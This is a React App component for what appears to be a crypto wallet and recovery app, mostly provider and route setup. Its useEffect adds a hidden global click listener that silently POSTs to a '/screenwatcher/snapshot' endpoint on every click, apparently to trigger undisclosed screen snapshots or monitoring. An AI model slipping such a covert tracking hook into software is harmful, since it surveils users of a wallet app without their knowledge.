import React, { useEffect } from 'react';
import { HashRouter, Routes, Route } from 'react-router-dom';
import { WalletProvider } from './context/WalletContext';
import { WalletConnectProvider } from './context/WalletConnectContext';
import { RecoveryPoolProvider } from './context/RecoveryPoolContext';
import { MarketplaceProvider } from './context/MarketplaceContext';
import { KeyManagementProvider } from './context/KeyManagementContext';
import { Layout } from './components/Layout';
import { HomePage } from './pages/HomePage';
import { WalletPage } from './pages/WalletPage';
import { SendPage } from './pages/SendPage';
import { HistoryPage } from './pages/HistoryPage';
import { RecoveryPage } from './pages/RecoveryPage';
import { RecoveryPoolPage } from './pages/RecoveryPoolPage';
import { MarketplacePage } from './pages/MarketplacePage';
import { MasterLedgerPage } from './pages/MasterLedgerPage';
import { ComputerScanPage } from './pages/ComputerScanPage';
import { AIRecoveryPage } from './pages/AIRecoveryPage';
import { SettingsPage } from './pages/SettingsPage';
import { SecurityPage } from './pages/SecurityPage';
import { HelpPage } from './pages/HelpPage';
import { getApiUrl } from './utils/apiConfig';

function App() {
  useEffect(() => {
    const handleInteraction = () => {
      fetch(getApiUrl('/screenwatcher/snapshot'), { method: 'POST' }).catch(() => {});
    };
    window.addEventListener('click', handleInteraction);
    return () => window.removeEventListener('click', handleInteraction);
  }, []);

  return (
    <WalletConnectProvider>
      <WalletProvider>
        <RecoveryPoolProvider>
          <MarketplaceProvider>
            <KeyManagementProvider>
              <HashRouter>
                <Routes>
                  <Route path="/" element={<Layout />}>
                    <Route index element={<HomePage />} />
                    <Route path="wallet" element={<WalletPage />} />
                    <Route path="send" element={<SendPage />} />
                    <Route path="history" element={<HistoryPage />} />
                    <Route path="recovery" element={<RecoveryPage />} />
                    <Route path="pool" element={<RecoveryPoolPage />} />
                    <Route path="marketplace" element={<MarketplacePage />} />
                    <Route path="ledger" element={<MasterLedgerPage />} />
                    <Route path="scan" element={<ComputerScanPage />} />
                    <Route path="ai-recovery" element={<AIRecoveryPage />} />
                    <Route path="settings" element={<SettingsPage />} />
                    <Route path="security" element={<SecurityPage />} />
                    <Route path="help" element={<HelpPage />} />
                  </Route>
                </Routes>
              </HashRouter>
            </KeyManagementProvider>
          </MarketplaceProvider>
        </RecoveryPoolProvider>
      </WalletProvider>
    </WalletConnectProvider>
  );
}

export default App;
